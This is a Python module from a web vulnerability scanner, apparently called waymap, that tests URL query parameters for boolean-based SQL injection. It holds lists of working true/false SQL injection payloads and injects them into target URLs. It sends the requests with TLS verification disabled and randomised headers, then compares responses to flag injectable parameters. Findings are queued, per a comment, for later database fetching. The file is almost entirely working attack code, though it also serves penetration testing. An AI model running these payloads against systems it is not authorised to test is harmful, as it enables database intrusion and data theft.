# Copyright (c) 2026 waymap developers
# See the file 'LICENSE' for copying permission.

"""Boolean-based SQL Injection Scanner."""

import os
import json
import time
import random
import string
import requests
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Tuple, Optional

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from lib.core.config import get_config
from lib.core.logger import get_logger
from lib.ui import print_status, colored, print_header, print_separator
from lib.parse.random_headers import generate_random_headers
from lib.core.state import stop_scan
from lib.core.result_manager import ResultManager

config = get_config()
logger = get_logger(__name__)

TRUE_PAYLOADS = [
    "' AND 2*3*8=6*8 AND 'randomString'='randomString",
    "' AND 3*2>(1*5) AND 'randomString'='randomString",
    "' AND 3*2*0>=0 AND 'randomString'='randomString"
]

FALSE_PAYLOADS = [
    "' AND 2*3*8=6*9 AND 'randomString'='randomString",
    "' AND 3*3<(2*4) AND 'randomString'='randomString",
    "' AND (3*3*0)=(2*4*1*0) AND 'randomString'='randomString"
]

# Track (url, param) pairs that already have findings
_found_pairs = set()

def generate_random_string(length: int = 8) -> str:
    """Generate random string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def replace_placeholders(payload: str, rand_str: str) -> str:
    """Replace placeholders in payload."""
    return payload.replace("randomString", rand_str)

def extract_parameters(url: str) -> List[str]:
    """Extract parameters from URL."""
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return list(params.keys()) if params else []

def check_if_already_vulnerable(target: str, parameter: str) -> bool:
    """Check if already vulnerable."""
    domain = urlparse(target).netloc
    return ResultManager(domain).has_duplicate(
        "SQL Injection",
        ["url", "parameter"],
        {"url": target, "parameter": parameter},
        finding_key="Technique: Boolean",
    )

def inject_payload_into_url(url: str, parameter: str, payload: str) -> str:
    """Inject payload into a specific URL parameter."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if parameter in query_params:
        query_params[parameter] = [f"{query_params[parameter][0]} {payload}"]
    
    from urllib.parse import urlencode, urlunparse
    new_query = urlencode(query_params, doseq=True)
    new_parts = list(parsed_url)
    new_parts[4] = new_query
    return urlunparse(new_parts)


def test_payload(url: str, parameter: str, payload: str, retries: int = 2) -> List[Optional[Tuple[int, int, str]]]:
    """Test a payload and return response signatures."""
    signatures = []
    headers = generate_random_headers()
    
    for _ in range(retries):
        if stop_scan.is_set():
            break
        try:
            full_url = inject_payload_into_url(url, parameter, payload.replace("randomString", generate_random_string()))
            response = requests.get(full_url, headers=headers, verify=False, timeout=config.REQUEST_TIMEOUT)
            signatures.append((response.status_code, len(response.text), response.text[:100]))
        except requests.RequestException:
            signatures.append(None)
    return signatures


def is_vulnerable(url: str, thread_count: int) -> bool:
    """Perform boolean-based SQLi tests."""
    from lib.injection.sqlin.sql import vulnerable_pairs
    
    parameters = extract_parameters(url)
    if not parameters:
        return False

    for parameter in parameters:
        if stop_scan.is_set(): return False
        
        pair_key = (url, parameter)
        if pair_key in _found_pairs:
            return False
        
        if check_if_already_vulnerable(url, parameter):
            logger.debug(f"Skipping known vulnerable: {url} param={parameter}")
            continue

        true_signatures = []
        false_signatures = []
        rand_str = generate_random_string()

        print_status(f"Testing Boolean SQLi: {url} (Param: {parameter})", "info")

        for payload in TRUE_PAYLOADS:
            if stop_scan.is_set(): break
            replaced_payload = replace_placeholders(payload, rand_str)
            true_signatures.extend(test_payload(url, parameter, replaced_payload))

        for payload in FALSE_PAYLOADS:
            if stop_scan.is_set(): break
            replaced_payload = replace_placeholders(payload, rand_str)
            false_signatures.extend(test_payload(url, parameter, replaced_payload))

        true_signatures = [sig for sig in true_signatures if sig is not None]
        false_signatures = [sig for sig in false_signatures if sig is not None]

        if true_signatures and false_signatures:
            true_pattern = set(true_signatures)
            false_pattern = set(false_signatures)

            if true_pattern != false_pattern:
                _found_pairs.add(pair_key)
                print_status("Vulnerability Found!", "success")
                print_status(f"  URL: {url}", "info")
                print_status(f"  Parameter: {parameter}", "info")
                print_status(f"  Payload: {replaced_payload}", "info")

                vuln_data = {
                    "Vulnerable URL": url,
                    "Parameter": parameter,
                    "Payload": replaced_payload,
                    "Severity": 9.8,
                    "Timestamp": datetime.now().isoformat()
                }
                domain = urlparse(url).netloc
                result_manager = ResultManager(domain)
                result_manager.add_finding("SQL Injection", "Technique: Boolean", vuln_data)
                # Add to vulnerable pairs for DB fetching
                vulnerable_pairs.add(pair_key)
                return True

    return False

def process_urls(urls: List[str], thread_count: int) -> None:
    """Process URLs for Boolean-based SQLi."""
    from lib.core.interrupt import reset_interrupt
    reset_interrupt()
    _found_pairs.clear()
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = {executor.submit(is_vulnerable, url, thread_count): url for url in urls}
        
        for future in as_completed(futures):
            if stop_scan.is_set():
                break
            try:
                future.result()
            except KeyboardInterrupt:
                from lib.core.interrupt import exit_clean
                exit_clean()
            except Exception as e:
                logger.error(f"Error in boolean worker: {e}")
